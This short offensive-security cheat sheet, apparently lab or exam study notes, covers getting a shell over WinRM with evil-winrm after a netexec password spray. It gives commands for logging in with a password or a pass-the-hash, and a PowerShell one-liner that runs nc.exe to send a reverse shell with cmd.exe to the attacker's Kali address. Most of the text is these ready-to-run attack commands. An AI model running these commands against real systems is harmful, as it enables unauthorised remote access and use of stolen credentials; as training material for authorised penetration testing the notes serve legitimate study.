> If you get a pwn3d for winrm when spraying with netexec:

```
evil-winrm -i <target_ip> -u <user> -p '<password>' 
```

> If you have a hash instead of a password:

```
evil-winrm -i <target_ip> -u <username> -H '<hash>' 
```

Once you have a session you could upgrade it using netcat by transferring netcat over from kali and then getting a reverse shell connection. This way you are not limited to powershell in evil-winrm:

> Run in evil-winrm to get a reverse shell with nc on kali to have a standard reverse shell:

```
powershell -Command "Start-Process -NoNewWindow -FilePath nc.exe -ArgumentList '<kali_ip> <port> -e cmd.exe'"
```

Once we have the reverse shell we can exit the evil-winrm shell without losing the new shell.

If this dosent work because it cant connect to your kali machine you will need to setup a listener on ligolo first.
